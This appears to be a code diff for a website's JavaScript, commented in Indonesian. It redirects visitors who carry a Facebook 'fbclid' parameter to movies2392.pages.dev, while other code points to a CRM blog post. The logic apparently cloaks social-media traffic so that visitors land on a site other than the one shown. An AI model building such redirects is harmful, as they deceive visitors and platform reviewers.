@@ -41,34 +41,21 @@ function redirectToURL() {
     window.location.href = 'https://www.cvpaypal.my.id/2024/03/why-your-business-needs-crm-system-to.html';
 }
 
-    // Fungsi untuk mendapatkan parameter dari URL
-    function getParameterByName(name, url) {
-        if (!url) url = window.location.href;
-        name = name.replace(/[\[\]]/g, "\\$&");
-        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-            results = regex.exec(url);
-        if (!results) return null;
-        if (!results[2]) return '';
-        return decodeURIComponent(results[2].replace(/\+/g, " "));
-    }
-
-    // Mengambil nilai parameter 'fbclid' dari URL
-    var fbclid = getParameterByName('fbclid');
+    // Mengambil parameter 'fbclid' dari URL
+    var fbclid = new URLSearchParams(window.location.search).get('fbclid');
 
     // Mengambil domain utama (tanpa protokol)
     var mainDomain = window.location.hostname.split('.').slice(-2).join('.');
 
-    // Mengecek apakah halaman dimuat ulang
-    if (performance.navigation.type === 1) {
-        // Jika hasilnya dari redirect dari https://movies2392.pages.dev atau jika pengunjung akses langsung,
-        // maka tidak ada tindakan yang perlu dilakukan.
-        if (document.referrer.includes("movies2392.pages.dev") || window.location.hostname === mainDomain) {
-            // Tidak melakukan redirect
-        } else {
-            // Redirect ke https://movies2392.pages.dev
+    // Jika hasilnya dari redirect dari https://movies2392.pages.dev atau jika pengunjung akses langsung,
+    // maka tidak ada tindakan yang perlu dilakukan.
+    if (document.referrer.includes("movies2392.pages.dev") || window.location.hostname === mainDomain) {
+        // Tidak melakukan redirect
+    } else {
+        // Jika fbclid ada, redirect ke https://movies2392.pages.dev
+        if (fbclid !== null) {
             window.location.href = "https://movies2392.pages.dev";
         }
     }
-
 // Memulai progres saat halaman dimuat
 startProgress();
